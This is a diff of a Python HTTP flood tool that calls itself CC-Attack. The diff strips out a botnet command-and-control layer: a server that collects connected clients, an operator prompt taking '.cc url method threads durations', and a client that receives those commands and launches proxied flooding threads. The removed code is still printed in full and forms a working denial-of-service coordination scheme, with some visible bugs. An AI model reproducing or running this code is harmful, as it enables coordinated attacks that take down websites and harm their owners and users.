@@ -764,13 +764,6 @@ def main():
 	durations = 60
 	proxy_file = "proxy.txt"
 	for n,args in enumerate(sys.argv):
-		if args == "-server":
-			commander_interface(sys.argv[n+1])
-			print("hi")
-			return
-		if args == "-client":
-			client(sys.argv[n+1])
-			return
 		if args == "-old":
 			oldcli(vars)
 			return
@@ -881,122 +874,6 @@ def main():
 	print("> Flooding...")
 	time.sleep(durations)
 
-
-'''
-End of CC-Attack functions
-
-Now is for communications
-'''
-conn_list = []
-def server(bind_addr,lock):
-	global conn_list
-	try:
-		s = socket.socket()
-		s.bind(bind_addr)
-		threading.Thread(target=keepalive_pool,args=(lock,),daemon=True)
-		while True:
-			conn,connAddr = s.accept()
-			conn.setsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-			conn.settimeout(15)
-			conn_list[connAddr] = conn
-	except:
-		return
-
-def keepalive_pool(lock):
-	global conn_list
-	while 1:
-		time.sleep(15)
-		for conn in conn_list:
-			try:
-				conn.send('\0')
-			except:
-				conn_list.remove(conn)
-		
-	
-def printHelp():
-	print("              Command list               ")
-	print(".cc   | .cc url methods threads durations")
-	print(".help | show this message                ")
-
-def commander_interface(bind_addr):
-	global conn_list
-	lock = threading.Lock()
-	threading.Thread(target=server,args=(bind_addr,lock,),daemon=True).start()
-	printHelp()
-	while True:
-		cmd = str(input(">"))
-		if cmd == ".help":
-			printHelp()
-		elif ".cc" in cmd:
-			cmd = cmd.strip().split()
-			if cmd[0] == ".cc":
-				if "http" in cmd[1] and "://" in cmd[1]:# it should be a normal url
-					if cmd[2].lower() in ["get","post","head"]:
-						try:
-							threads = int(cmd[3])
-							durations = int(cmd[4])
-							
-							for conn in conn_list:
-								threading.Thread(target=sendCmd2conn,args=(cmd,conn,lock,)).start()
-						except:
-							print("> wrong command")
-
-def sendCmd2conn(cmd,conn,lock):
-	try:
-		conn.send(cmd)
-	except:
-		lock.acquire()
-		conn_list.remove(conn)
-		lock.release()
-
-######################################
-# .cc url methods threads durations #
-#####################################
-
-def parse_cmd(cmd):
-	vars = global_vars()
-	if cmd[0] == ".cc":
-		if "http" in cmd[1] and "://" in cmd[1]:# it should be a normal url
-			if cmd[2].lower() in ["get","post","head"]:
-				try:
-					threads = int(cmd[3])
-					durations = int(cmd[4])
-					vars.method = cmd[2].lower()
-					# if no error it means cmd[3] is integer
-					proxy_file = "proxy.txt"
-					vars.proxies_list = open(proxy_file).readlines()
-					ParseUrl(cmd[1],vars)# Parse url
-
-					event = threading.Event()
-					th_list = []
-					for _ in range(threads):
-						th = threading.Thread(target=CC_ATTACK,args=(vars,event),daemon=True)
-						th.start()
-						th_list.append(th)
-					event.set()
-					event.clear()
-					time.sleep(durations)
-					return
-				except:
-					pass
-
-def client(server_addr):
-	try:
-		s = socket.socket()
-		s.connect(server_addr)
-		s.setsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-		s.settimeout(15)
-		while 1:
-			try:
-				raw_cmd = s.recv(1024) # It should be enough
-				cmd = str(raw_cmd).strip().split()
-				multiprocessing.Process(target=parse_cmd,args=(cmd,)).start()
-			except EOFError:
-				return
-			except:
-				pass
-	except:
-		return
 
 if __name__ == '__main__':
 	PrintLogo()
